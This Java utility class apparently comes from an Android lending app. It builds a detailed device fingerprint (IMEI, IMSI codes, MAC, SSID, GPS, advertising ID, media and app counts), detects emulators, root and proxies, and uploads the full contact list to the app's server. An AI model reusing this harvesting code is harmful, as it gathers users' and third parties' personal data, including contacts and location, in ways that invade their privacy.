package com.u1.gocashm.util;

import android.Manifest;
import android.app.Activity;
import android.app.ActivityManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.net.ConnectivityManager;
import android.net.LinkProperties;
import android.net.Network;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.os.SystemClock;
import android.provider.MediaStore;
import android.provider.Settings;

import androidx.core.app.ActivityCompat;

import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.text.format.Formatter;
import android.util.DisplayMetrics;

import com.blankj.utilcode.util.AppUtils;
import com.blankj.utilcode.util.DeviceUtils;
import com.blankj.utilcode.util.NetworkUtils;
import com.blankj.utilcode.util.PermissionUtils;
import com.blankj.utilcode.util.PhoneUtils;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.u1.gocashm.PhApplication;
import com.u1.gocashm.util.constant.PhConstants;
import com.u1.gocashm.util.constant.TimeFormatConfigs;
import com.u1.gocashm.util.http.UploadInfoUtils;
import com.u1.gocashm.util.model.ContactInfo;
import com.u1.gocashm.util.model.ContactModel;
import com.u1.gocashm.util.model.DeviceInfo;
import com.u1.gocashm.util.model.DeviceNewInfo;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.LineNumberReader;
import java.lang.reflect.Method;
import java.math.BigDecimal;
import java.net.Inet6Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.text.DecimalFormat;
import java.util.Collections;
import java.util.Date;
import java.util.Enumeration;
import java.util.LinkedList;
import java.util.List;
import java.util.Locale;
import java.util.TimeZone;

public class AppPhUtils {
    private static final String TAG = AppPhUtils.class.getSimpleName();
    private final static String[] KNOWN_FILES = {
            "/system/lib/libc_malloc_debug_qemu.so", "/sys/qemu_trace",
            "/system/bin/qemu-props"};

    /**
     * 获取手机厂商
     */
    public static String getManufacturer() {
        return Build.MANUFACTURER;
    }

    /**
     * 获取手机型号
     */
    public static String getDevice() {
        return Build.MODEL;
    }

    /**
     * 获取Android版本
     */
    public static String getSdkVersion() {
        return String.valueOf(Build.VERSION.SDK_INT);
    }

    /**
     * 获取IMEI/MEID
     */
    public static String getDeviceId() {
        TelephonyManager telephonyManager = (TelephonyManager) PhApplication.getInstance()
                .getSystemService(Context.TELEPHONY_SERVICE);
        try {
            if (null != telephonyManager) {
                if (ActivityCompat.checkSelfPermission(PhApplication.getInstance(), Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                    // TODO: Consider calling
                    return Build.SERIAL;
                }
                if (null != telephonyManager.getDeviceId()) {
                    return telephonyManager.getDeviceId();
                } else {
                    return Settings.Secure.getString(PhApplication.getInstance().getContentResolver(), Settings.Secure.ANDROID_ID);
                }
            }
        } catch (Exception e) {

        }
        return Build.SERIAL;
    }

    /**
     * 获取SERIAL
     */
    public static String getDeviceSerialId() {
        return Build.SERIAL;
    }

    /**
     * 获取MAC
     */
    public static String getMacName() {
        try {
            List<NetworkInterface> all = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface nif : all) {
                if (!nif.getName().equalsIgnoreCase("wlan0")) continue;
                byte[] macBytes = nif.getHardwareAddress();
                if (macBytes == null) {
                    return "02:00:00:00:00:02";
                }
                StringBuilder res1 = new StringBuilder();
                for (byte b : macBytes) {
                    res1.append(String.format("%02X:", b));
                }
                if (res1.length() > 0) {
                    res1.deleteCharAt(res1.length() - 1);
                }
                return res1.toString();
            }
        } catch (Exception ex) {
            return "02:00:00:00:00:02";
        }
        return "02:00:00:00:00:02";
    }

    /**
     * 获取WIFI
     */
    public static String getWifiName() {
        WifiManager wifiManager = (WifiManager) PhApplication.getInstance().getApplicationContext()
                .getSystemService(Context.WIFI_SERVICE);
        try {
            if (null != wifiManager) {
                WifiInfo wifiInfo = wifiManager.getConnectionInfo();
                if (null != wifiInfo) {
                    return wifiInfo.getSSID();
                }
            }
        } catch (Exception e) {

        }
        return "";
    }

    /**
     * 获取内网IP
     */
    public static String getHostIP() {
        String hostIp = "";
        try {
            Enumeration enumeration = NetworkInterface.getNetworkInterfaces();
            InetAddress inetAddress;
            while (enumeration.hasMoreElements()) {
                NetworkInterface networkInterface = (NetworkInterface) enumeration.nextElement();
                Enumeration<InetAddress> addressList = networkInterface.getInetAddresses();
                while (addressList.hasMoreElements()) {
                    inetAddress = addressList.nextElement();
                    if (inetAddress instanceof Inet6Address) {
                        continue;// skip ipv6
                    }
                    String ip = inetAddress.getHostAddress();
                    if (!"127.0.0.1".equals(ip)) {
                        hostIp = inetAddress.getHostAddress();
                        break;
                    }
                }
            }
        } catch (SocketException e) {
            e.printStackTrace();
        }
        return hostIp;
    }

    /**
     * 是否代理
     */
    public static boolean isWifiProxy() {
        String proxyAddress = System.getProperty("http.proxyHost");
        String portStr = System.getProperty("http.proxyPort");
        int proxyPort = Integer.parseInt((portStr != null ? portStr : "-1"));
        return (!TextUtils.isEmpty(proxyAddress)) && (proxyPort != -1);
    }

    /**
     * 是否ROOT
     */
    public static boolean isRoot() {
        try {
            if ((new File("/system/bin/su").exists())
                    || (new File("/system/xbin/su").exists())) {
                return true;
            }
        } catch (Exception e) {

        }
        return false;
    }

    /**
     * 获取经纬度
     */
    public static void updateDevice(String token, DeviceInfo deviceInfos, Context context, String width, String height, String anglex, String angley, String anglez) {
        DeviceNewInfo deviceInfo = new DeviceNewInfo();
        try {
//        deviceInfo.setStartTime(TimeFormatConfigs.format.format(new Date(SharedPreferencesPhUtil.getInstance(PhApplication.getInstance()).getLong(PhConstants.PhUserBehavior.APP_START_TIME, 0L))));
            deviceInfo.setAvailableMemory(getTotalMemorySize(context));
            deviceInfo.setResidualMemory(getAvailableMemorySize(context));
            deviceInfo.setPersistentDeviceId(getDeviceSerialId());
            deviceInfo.setImei(DevicePhUtil.getDeviceIMEI(context));
            deviceInfo.setDeviceName(getDevice());
            deviceInfo.setDevice(Build.DEVICE);
            deviceInfo.setDeviceVersion(Build.VERSION.RELEASE);
            deviceInfo.setResolution(width + "_" + height);
            deviceInfo.setIntranetIP(NetworkUtils.getIPAddress(true));
            deviceInfo.setWifiMac(getMacName());
            deviceInfo.setSsid(getWifiName());
            deviceInfo.setIsAgent(isWifiProxy() ? "1" : "0");
            deviceInfo.setIsRoot(DeviceUtils.isDeviceRooted() ? "1" : "0");
            deviceInfo.setIsCommunication(PhoneUtils.isPhone() ? "Y" : "N");
            deviceInfo.setIsSimulator((isSimulator(context) ? "Y" : "N"));
            deviceInfo.setGoogleAdvertisingId(SharedPreferencesPhUtil.getInstance(context).getString(PhConstants.ADVERTISID));
            if ("0.0".equals(anglex)) {
                anglex = "-999";
            }
            deviceInfo.setAnglex(anglex);
            if ("0.0".equals(angley)) {
                angley = "-999";
            }
            deviceInfo.setAngley(angley);
            if ("0.0".equals(anglez)) {
                anglez = "-999";
            }
            deviceInfo.setAnglez(anglez);
            deviceInfo.setRunMemory(getTotalMemory(context));
            deviceInfo.setMemoryUsed(getUseMemory(context));
            deviceInfo.setBasebandVersion(getBaseband_Ver());
            deviceInfo.setNetworkOperators(PhoneUtils.getSimOperatorName());
            deviceInfo.setMobileNetworkType(NetworkUtils.getNetworkType().toString());
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                String meid = null;
                try {
                    meid = PhoneUtils.getMEID();
                } catch (Exception e) {
                    e.printStackTrace();
                }
                if ("00000000000000".equals(meid)) {
                    meid = null;
                }
                deviceInfo.setMeid(meid);
                deviceInfo.setMcc(PhoneUtils.getIMSI() != null ? PhoneUtils.getIMSI().substring(0, 3) : "");
                deviceInfo.setMnc(PhoneUtils.getIMSI() != null ? PhoneUtils.getIMSI().substring(3, 5) : "");
            }
            deviceInfo.setHowLongBootTime(String.valueOf(SystemClock.elapsedRealtime() / (60 * 1000)));
            deviceInfo.setUpTime(SystemClock.elapsedRealtime());
            deviceInfo.setSystemLanguage(Locale.getDefault().getLanguage());
            deviceInfo.setTimeZone(TimeZone.getDefault().getDisplayName(false, TimeZone.SHORT));
            deviceInfo.setSystemTime(TimeFormatConfigs.format.format(new Date(System.currentTimeMillis())));
            deviceInfo.setScreenBrightness(String.valueOf(getScreenBrightness(context)));
            deviceInfo.setNfcFunction(context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_NFC) ? "Y" : "N");
            try {
                deviceInfo.setNumberOfPhotos(getList(new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getAbsolutePath() + "/Camera"))
                        + getList(new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES).getAbsolutePath())));
            } catch (Exception e) {
                deviceInfo.setNumberOfPhotos(0);
            }
            deviceInfo.setNumberOfSongs(getAudioCount(context));
            deviceInfo.setNumberOfVideos(getVideoCount(context));
            deviceInfo.setBootTime(TimeFormatConfigs.format.format(new Date(System.currentTimeMillis() - SystemClock.elapsedRealtime())));
            deviceInfo.setSignalStrength(deviceInfos.getSignalStrength());
            deviceInfo.setBatteryPower(Integer.parseInt(deviceInfos.getBatteryPower()));
            deviceInfo.setBatteryStatus(deviceInfos.getBatteryStatus());
//        deviceInfo.setv(String.valueOf(BuildConfig.VERSION_CODE));
            deviceInfo.setGpsInfo(getGpsInfo());
            deviceInfo.setNativePhone(deviceInfos.getPhone());
            deviceInfo.setOs("android");
            deviceInfo.setOsVersion(Build.VERSION.RELEASE);
            deviceInfo.setTotalRom(getTotalMemorySize());
            deviceInfo.setUsedRom(getUseMemorySize());
            deviceInfo.setFreeRom(getAvailableMemorySize());
            deviceInfo.setTotalRam(getTotalMemory(context));
            deviceInfo.setUsedRam(getUseMemory(context));
            deviceInfo.setFreeRam(getFreeMemory(context));
            deviceInfo.setPhoneBrand(Build.BRAND);
            deviceInfo.setProduct(Build.PRODUCT);
            deviceInfo.setNumberOfApplications(String.valueOf(AppUtils.getAppsInfo().size()));
            deviceInfo.setIccid(Build.SERIAL);
            deviceInfo.setPersistentDeviceId(Build.SERIAL);
            deviceInfo.setResolutionWidth(width);
            deviceInfo.setResolutionHigh(height);
            if (NetworkUtils.isWifiAvailable()) {
                deviceInfo.setWifiIp(NetworkUtils.getIpAddressByWifi());
            } else {
                deviceInfo.setCellIp(NetworkUtils.getIPAddress(true));
            }
            deviceInfo.setRequestIp(NetworkUtil.getNetIp());
            deviceInfo.setCarrier(NetworkUtils.getNetworkOperatorName());
            deviceInfo.setDns(getDnsFromIp(context));
            deviceInfo.setRadioType(NetworkUtils.getNetworkType().name());
            deviceInfo.setTotalCapacity(getTotalMemorySize());
            deviceInfo.setAvailableCapacity(getAvailableMemorySize());
        } catch (Exception e){}
        UploadInfoUtils.updateDevice(token, deviceInfo);
    }

    public static String getGpsInfo() {
        String gpsInfo = "0,0";
        Location location = GpsPhUtils.getLocation();
        if (location != null) {
            gpsInfo = location.getLatitude() + "," + location.getLongitude();
        }
        return gpsInfo;
    }

    /**
     * 获取屏幕亮度
     *
     * @return
     */
    public static int getScreenBrightness(Context context) {
        ContentResolver contentResolver = context.getContentResolver();
        int defVal = 125;
        return Settings.System.getInt(contentResolver,
                Settings.System.SCREEN_BRIGHTNESS, defVal);
    }


    /**
     * 获取文件夹文件个数
     *
     * @param f
     * @return
     */
    public static int getList(File f) {
        if (!PermissionUtils.isGranted(Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
            return -999;
        }
        int size = 0;
        File flist[] = f.listFiles();
        size = flist.length;
        for (int i = 0; i < flist.length; i++) {
            if (flist[i].isDirectory()) {
                size = size + getList(flist[i]);
                size--;
            }
        }
        return size;
    }

    /**
     * 获取总空间大小
     */
    public static String getTotalMemorySize(Context context) {
        long fileSize;
        if (isExternalStorageAvailable()) {
            fileSize = getTotalExternalMemorySize();
        } else {
            fileSize = getTotalInternalMemorySize();
        }
        return Formatter.formatFileSize(context, fileSize);
    }

    /**
     * 获取可用空间大小
     */
    public static String getAvailableMemorySize(Context context) {
        long fileSize;
        if (isExternalStorageAvailable()) {
            fileSize = getAvailableExternalMemorySize();
        } else {
            fileSize = getAvailableInternalMemorySize();
        }
        return Formatter.formatFileSize(context, fileSize);
    }

    public static String getTotalMemory(Context context) {
        ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        ActivityManager.MemoryInfo info = new ActivityManager.MemoryInfo();
        manager.getMemoryInfo(info);
        return Formatter.formatFileSize(context, info.totalMem);
    }

    /**
     * 获取已用内存
     *
     * @param context
     * @return
     */
    public static String getUseMemory(Context context) {
        ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        ActivityManager.MemoryInfo info = new ActivityManager.MemoryInfo();
        manager.getMemoryInfo(info);
        return Formatter.formatFileSize(context, info.totalMem - info.availMem);
    }

    /**
     * 获取可用内存
     *
     * @param context
     * @return
     */
    public static String getFreeMemory(Context context) {
        ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        ActivityManager.MemoryInfo info = new ActivityManager.MemoryInfo();
        manager.getMemoryInfo(info);
        return Formatter.formatFileSize(context, info.availMem);
    }

    /**
     * BASEBAND-VER
     * 基带版本
     * return String
     */

    public static String getBaseband_Ver() {
        String Version = "";
        try {
            Class cl = Class.forName("android.os.SystemProperties");
            Object invoker = cl.newInstance();
            Method m = cl.getMethod("get", new Class[]{String.class, String.class});
            Object result = m.invoke(invoker, new Object[]{"gsm.version.baseband", "no message"});
            Version = (String) result;
        } catch (Exception e) {
        }
        return Version;
    }

    /**
     * 检查cpu内核判断是否为模拟器
     *
     * @return true 为模拟器 false 为真机
     */
    private static boolean checkEmulatorCupInfo() {
        String result = "";
        try {
            String[] args = {"/system/bin/cat", "/proc/cpuinfo"};
            ProcessBuilder cmd = new ProcessBuilder(args);
            Process process = cmd.start();
            StringBuffer sb = new StringBuffer();
            String readLine = "";
            BufferedReader responseReader = new BufferedReader(new InputStreamReader(process.getInputStream(), "utf-8"));
            while ((readLine = responseReader.readLine()) != null) {
                sb.append(readLine);
            }
            responseReader.close();
            result = sb.toString().toLowerCase();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return (!result.contains("arm")) || (result.contains("intel")) || (result.contains("amd"));
    }

    /**
     * 检查模拟器文件判断是否为模拟器
     *
     * @return true 为模拟器 false 不是模拟器
     */
    private static boolean checkEmulatorFiles() {
        for (String file_name : KNOWN_FILES) {
            File qemu_file = new File(file_name);
            if (qemu_file.exists()) {
                return true;
            }
        }
        return false;
    }

    /**
     * 获取地址
     */
    public static String getCity() {
        Location location = GpsPhUtils.getLocation();
        if (location != null) {
            try {
                Geocoder geocoder = new Geocoder(PhApplication.getInstance(), Locale.getDefault());
                List<Address> result = geocoder.getFromLocation(location.getLatitude(),
                        location.getLongitude(), 1);
                if (null != result && !result.isEmpty()) {
                    return result.get(0).getLocality();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return "";
    }

    /**
     * 获取屏幕宽
     */
    public static String getScreenWidth(Activity activity) {
        DisplayMetrics displayMetrics = new DisplayMetrics();
        activity.getWindowManager().getDefaultDisplay()
                .getMetrics(displayMetrics);
        return String.valueOf(displayMetrics.widthPixels);
    }

    /**
     * 获取屏幕高
     */
    public static String getScreenHeight(Activity activity) {
        DisplayMetrics displayMetrics = new DisplayMetrics();
        activity.getWindowManager().getDefaultDisplay()
                .getMetrics(displayMetrics);
        return String.valueOf(displayMetrics.heightPixels);
    }

    /**
     * 获取总空间大小
     */
    public static String getTotalMemorySize() {
        long fileSize;
        if (isExternalStorageAvailable()) {
            fileSize = getTotalExternalMemorySize();
        } else {
            fileSize = getTotalInternalMemorySize();
        }

        DecimalFormat decimalFormat = new DecimalFormat("#.00");
        StringBuffer stringBuffer = new StringBuffer();
        stringBuffer.append(decimalFormat.format(new BigDecimal(fileSize).divide(new BigDecimal(1073741824L))));
        stringBuffer.append("GB");
        return stringBuffer.toString();
    }

    /**
     * 获取可用空间大小
     */
    public static String getAvailableMemorySize() {
        long fileSize;
        if (isExternalStorageAvailable()) {
            fileSize = getAvailableExternalMemorySize();
        } else {
            fileSize = getAvailableInternalMemorySize();
        }

        DecimalFormat decimalFormat = new DecimalFormat("#.00");
        StringBuffer stringBuffer = new StringBuffer();
        stringBuffer.append(decimalFormat.format(new BigDecimal(fileSize).divide(new BigDecimal(1073741824L))));
        stringBuffer.append("GB");
        return stringBuffer.toString();
    }

    /**
     * 获取已用空间大小
     */
    public static String getUseMemorySize() {
        long fileSize;
        if (isExternalStorageAvailable()) {
            fileSize = getTotalExternalMemorySize() - getAvailableExternalMemorySize();
        } else {
            fileSize = getTotalExternalMemorySize() - getAvailableInternalMemorySize();
        }

        DecimalFormat decimalFormat = new DecimalFormat("#.00");
        StringBuffer stringBuffer = new StringBuffer();
        stringBuffer.append(decimalFormat.format(new BigDecimal(fileSize).divide(new BigDecimal(1073741824L))));
        stringBuffer.append("GB");
        return stringBuffer.toString();
    }

    /**
     * 外部存储是否可用 (存在且具有读写权限)
     */
    private static boolean isExternalStorageAvailable() {
        return Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED);
    }

    /**
     * 获取手机内部可用空间大小
     */
    private static long getAvailableInternalMemorySize() {
        File path = Environment.getDataDirectory();
        StatFs stat = new StatFs(path.getPath());
        long blockSize = stat.getBlockSize();
        long availableBlocks = stat.getAvailableBlocks();
        return availableBlocks * blockSize;
    }

    /**
     * 获取手机内部总空间大小
     */
    private static long getTotalInternalMemorySize() {
        File path = Environment.getDataDirectory();//Gets the Android data directory
        StatFs stat = new StatFs(path.getPath());
        long blockSize = stat.getBlockSize();      //每个block 占字节数
        long totalBlocks = stat.getBlockCount();   //block总数
        return totalBlocks * blockSize;
    }

    /**
     * 获取手机外部可用空间大小
     */
    private static long getAvailableExternalMemorySize() {
        File path = Environment.getExternalStorageDirectory();//获取SDCard根目录
        StatFs stat = new StatFs(path.getPath());
        long blockSize = stat.getBlockSize();
        long availableBlocks = stat.getAvailableBlocks();
        return availableBlocks * blockSize;
    }

    /**
     * 获取手机外部总空间大小
     */
    private static long getTotalExternalMemorySize() {
        File path = Environment.getExternalStorageDirectory(); //获取SDCard根目录
        StatFs stat = new StatFs(path.getPath());
        long blockSize = stat.getBlockSize();
        long totalBlocks = stat.getBlockCount();
        return totalBlocks * blockSize;
    }

    /*
     * 判断设备 是否使用代理上网
     * */
    public static boolean isWifiProxy(Context context) {

        final boolean IS_ICS_OR_LATER = Build.VERSION.SDK_INT >= Build.VERSION_CODES.ICE_CREAM_SANDWICH;

        String proxyAddress;

        int proxyPort;

        if (IS_ICS_OR_LATER) {

            proxyAddress = System.getProperty("http.proxyHost");

            String portStr = System.getProperty("http.proxyPort");

            proxyPort = Integer.parseInt((portStr != null ? portStr : "-1"));

        } else {

            proxyAddress = android.net.Proxy.getHost(context);

            proxyPort = android.net.Proxy.getPort(context);

        }

        return (!TextUtils.isEmpty(proxyAddress)) && (proxyPort != -1);

    }

    public static void uploadDeviceInfo(String token, DeviceInfo deviceInfo, Context context, String width, String height, String anglex, String angley, String anglez) {
        try {
            updateDevice(token, deviceInfo, context, width, height, anglex, angley, anglez);
        } catch (Exception e) {
            e.printStackTrace();
        }
//        try {
//            JSONArray phoneAlbum = AlbumUtil.getPhoneAlbum(context);
//            if (phoneAlbum != null) {
//                UploadInfoUtils.uploadPhotoInfo(token, phoneAlbum.toString());
//            }
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
    }

    public static void updateContactList(String token) {
        try {
            List<ContactInfo> contactList = ContactsPhUtils.getContacts();
            ContactModel contactModel = new ContactModel();
            contactModel.setToken(token);
            contactModel.setData(GsonPhHelper.getGson().toJson(contactList));
            UploadInfoUtils.updateContact(contactModel);
            UploadInfoUtils.updateContactCount(token, String.valueOf(contactList.size()));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static String getAdvertisId(Context context) {
        String advertisId = "";
        try {
            advertisId = AdvertisingIdClient.getAdvertisingIdInfo(context).getId();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return advertisId;
    }

    private static boolean isSimulator(Context context) {
        String url = "tel:" + "123456";
        Intent intent = new Intent();
        intent.setData(Uri.parse(url));
        intent.setAction(Intent.ACTION_DIAL);
        // 是否可以处理跳转到拨号的 Intent
        boolean canCallPhone = intent.resolveActivity(context
                .getPackageManager()) != null;
        return Build.FINGERPRINT.startsWith("generic") || Build.FINGERPRINT.toLowerCase()
                .contains("vbox") || Build.FINGERPRINT.toLowerCase()
                .contains("test-keys") || Build.MODEL.contains("google_sdk") || Build.MODEL.contains("Emulator") || Build.MODEL
                .contains("MuMu") || Build.MODEL.contains("virtual") || Build.SERIAL.equalsIgnoreCase("android") || Build.MANUFACTURER
                .contains("Genymotion") || (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")) || "google_sdk"
                .equals(Build.PRODUCT) || ((TelephonyManager) context
                .getSystemService(Context.TELEPHONY_SERVICE)).getNetworkOperatorName()
                .toLowerCase()
                .equals("android") || !canCallPhone || Build.SERIAL.contains("unkonwn");
    }

    /**
     * 获取dns
     *
     * @param context
     * @return
     */
    public static String getDnsFromIp(Context context) {
        /**
         * 获取dns
         */
        String[] dnsServers = getDnsFromCmd();
        if (dnsServers == null || dnsServers.length == 0) {
            dnsServers = getDnsFromConnectionManager(context);
        }
        /**
         * 组装
         */
        StringBuffer sb = new StringBuffer();
        if (dnsServers != null) {
            for (int i = 0; i < dnsServers.length; i++) {
                sb.append(dnsServers[i]);
            }
        }
        //
        return sb.toString();
    }


    //通过 getprop 命令获取
    private static String[] getDnsFromCmd() {
        LinkedList<String> dnsServers = new LinkedList<>();
        try {
            Process process = Runtime.getRuntime().exec("getprop");
            InputStream inputStream = process.getInputStream();
            LineNumberReader lnr = new LineNumberReader(new InputStreamReader(inputStream));
            String line = null;
            while ((line = lnr.readLine()) != null) {
                int split = line.indexOf("]: [");
                if (split == -1) continue;
                String property = line.substring(1, split);
                String value = line.substring(split + 4, line.length() - 1);
                if (property.endsWith(".dns")
                        || property.endsWith(".dns1")
                        || property.endsWith(".dns2")
                        || property.endsWith(".dns3")
                        || property.endsWith(".dns4")) {
                    InetAddress ip = InetAddress.getByName(value);
                    if (ip == null) continue;
                    value = ip.getHostAddress();
                    if (value == null) continue;
                    if (value.length() == 0) continue;
                    dnsServers.add(value);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return dnsServers.isEmpty() ? new String[0] : dnsServers.toArray(new String[dnsServers.size()]);
    }


    private static String[] getDnsFromConnectionManager(Context context) {
        LinkedList<String> dnsServers = new LinkedList<>();
        if (Build.VERSION.SDK_INT >= 21 && context != null) {
            ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(context.CONNECTIVITY_SERVICE);
            if (connectivityManager != null) {
                NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
                if (activeNetworkInfo != null) {
                    for (Network network : connectivityManager.getAllNetworks()) {
                        NetworkInfo networkInfo = connectivityManager.getNetworkInfo(network);
                        if (networkInfo != null && networkInfo.getType() == activeNetworkInfo.getType()) {
                            LinkProperties lp = connectivityManager.getLinkProperties(network);
                            for (InetAddress addr : lp.getDnsServers()) {
                                dnsServers.add(addr.getHostAddress());
                            }
                        }
                    }
                }
            }
        }
        return dnsServers.isEmpty() ? new String[0] : dnsServers.toArray(new String[dnsServers.size()]);
    }

    /**
     * 获取视频数量
     * @param context
     * @return
     */
    private static int getVideoCount(Context context){
        if (!PermissionUtil.checkPermission(context,Manifest.permission.READ_EXTERNAL_STORAGE)){
            return 0;
        }
        Cursor videoCursor = context.getContentResolver().query(
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                null, null, null, null);
        int count=0;
        while (videoCursor.moveToNext()){
            count++;
        }
        videoCursor.close();
        return count;
    }

    /**
     * 获取音频数量
     * @param context
     * @return
     */
    private static int getAudioCount(Context context){
        if (!PermissionUtil.checkPermission(context,Manifest.permission.READ_EXTERNAL_STORAGE)){
            return 0;
        }
        Cursor audioCursor = context.getContentResolver().query(
                MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                null, null, null, null);
        int count=0;
        while (audioCursor.moveToNext()){
            count++;
        }
        audioCursor.close();
        return count;
    }
}
